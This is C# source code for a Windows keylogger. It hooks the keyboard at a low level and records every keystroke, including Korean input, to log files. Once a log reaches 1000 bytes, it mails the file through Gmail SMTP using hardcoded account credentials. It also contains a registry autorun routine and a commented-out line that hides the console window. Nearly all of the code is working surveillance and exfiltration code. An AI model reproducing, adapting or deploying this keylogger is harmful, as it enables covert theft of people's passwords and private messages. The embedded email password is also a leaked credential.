using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        //mapping
        #region
        public static Dictionary<char, char> table = new Dictionary<char, char>()
        {
            {'q','ㅂ' },
            {'w','ㅈ' },
            {'e','ㄷ' },
            {'r','ㄱ' },
            {'t','ㅅ' },
            {'y','ㅛ' },
            {'u','ㅕ' },
            {'i','ㅑ' },
            {'o','ㅐ' },
            {'p','ㅔ' },
            {'a','ㅁ' },
            {'s','ㄴ' },
            {'d','ㅇ' },
            {'f','ㄹ' },
            {'g','ㅎ' },
            {'h','ㅗ' },
            {'j','ㅓ' },
            {'k','ㅏ' },
            {'l','ㅣ' },
            {'z','ㅋ' },
            {'x','ㅌ' },
            {'c','ㅊ' },
            {'v','ㅍ' },
            {'b','ㅠ' },
            {'n','ㅜ' },
            {'m','ㅡ' },

        };
        #endregion

        //import dll and setting 
        #region
        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();
        [DllImport("imm32.dll")]
        private static extern IntPtr ImmGetDefaultIMEWnd(IntPtr hWnd);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelkeyboardProc lpfn, IntPtr hMod, uint dweTreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowshookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWond, int nCmdShow);

        [DllImport("user32")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr IParam);

        static bool isKoean = true;

        const int SW_HIDE = 0;

        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelkeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private const int WM_IME_CONTROL = 643;

        static FileInfo file;
        #endregion

        private delegate IntPtr LowLevelkeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static int number = 1;

        static void Mai(string[] args)
        {
            
            var handle = GetConsoleWindow();

            //ShowWindow(handle, SW_HIDE);//
            _hookID = SetHook(_proc);

            Application.Run();
            AutoRun();
            UnhookWindowshookEx(_hookID);


        }

        static void AutoRun()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(
                                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            if (registryKey.GetValue("MyApp") == null)
            {
                registryKey.SetValue("MyApp", Application.ExecutablePath.ToString());
            }
            if (registryKey.GetValue("MyApp") != null)
            {
                registryKey.DeleteValue("MyApp", false);
            }
        }

        private static IntPtr SetHook(LowLevelkeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        //[MethodImpl(MethodImplOptions.Synchronized)]
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            KeysConverter kc = new KeysConverter();
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                StreamWriter sw = new StreamWriter(Application.StartupPath + (@"\log"+number+".txt"), true);
                IntPtr hwnd = GetForegroundWindow();
                IntPtr hime = ImmGetDefaultIMEWnd(hwnd);
                IntPtr status = SendMessage(hime, WM_IME_CONTROL, new IntPtr(0x5), new IntPtr(0));
                if (status.ToInt32() != 0)
                    isKoean = true;
                else
                    isKoean = false;

                if (isKoean && table.ContainsKey(kc.ConvertToString((Keys)vkCode).ToLower()[0]) && kc.ConvertToString((Keys)vkCode).Length <= 1)
                {
                    sw.Write(table[kc.ConvertToString((Keys)vkCode).ToLower()[0]]);
                    Console.Write(table[kc.ConvertToString((Keys)vkCode).ToLower()[0]]);
                }
                else
                {
                    sw.Write((Keys)vkCode);
                    Console.Write((Keys)vkCode);
                }
                //sw.Write(table[kc.ConvertToString((Keys)vkCode)[0]]);
                sw.Write("\r\n");
                sw.Close();
                file= new FileInfo(Application.StartupPath + "\\log"+number+".txt");
                if(file.Length >= 1000)
                {
                   new Thread(new ThreadStart(SendMail)).Start();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void SendMail()
        {
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.DeliveryMethod= SmtpDeliveryMethod.Network;
            client.Credentials = new System.Net.NetworkCredential("paw1345@gmail.com", "palioweekend2345");

            MailAddress from = new MailAddress("paw1345@gmail.com", "palioweekend2345", System.Text.Encoding.UTF8);
            MailAddress to = new MailAddress("paw1345@gmail.com");

            MailMessage message = new MailMessage(from, to);
            Attachment attachment;
            attachment = new Attachment(Application.StartupPath + "\\log"+number+".txt");
            message.Attachments.Add(attachment);
            number++;
            try
            {
                client.Send(message);
            }catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

    }
}
